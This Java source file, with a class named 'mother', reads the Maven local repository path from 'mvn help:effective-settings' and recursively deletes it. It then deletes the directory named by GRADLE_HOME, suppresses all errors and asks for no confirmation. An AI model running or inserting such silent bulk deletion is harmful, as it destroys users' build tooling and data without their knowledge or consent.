import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;

public class mother {
    public static void main(String[] args) {
        try (BufferedReader is = new BufferedReader(new InputStreamReader(
                Runtime.getRuntime().exec("mvn help:effective-settings").getInputStream()))) {

            String line;
            String prefix = "<localRepository>";
            String eof = "</localRepository>";

            while ((line = is.readLine()) != null) {
                String target = new String(line.getBytes(StandardCharsets.UTF_8));
                if (target.contains(eof)) {
                    String mvn = target.substring(target.indexOf(prefix) + 17, target.indexOf(eof));
                    clean(mvn);
                }
            }

            clean(System.getenv("GRADLE_HOME"));
        } catch (Exception ignored) {

        }
    }

    public static void clean(String goal) {
        try {
            Files.walkFileTree(Paths.get(goal), new SimpleFileVisitor<>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exc) throws IOException {
                    if (exc == null) {
                        Files.delete(dir);
                    }
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (Exception ignored) {

        }
    }
}
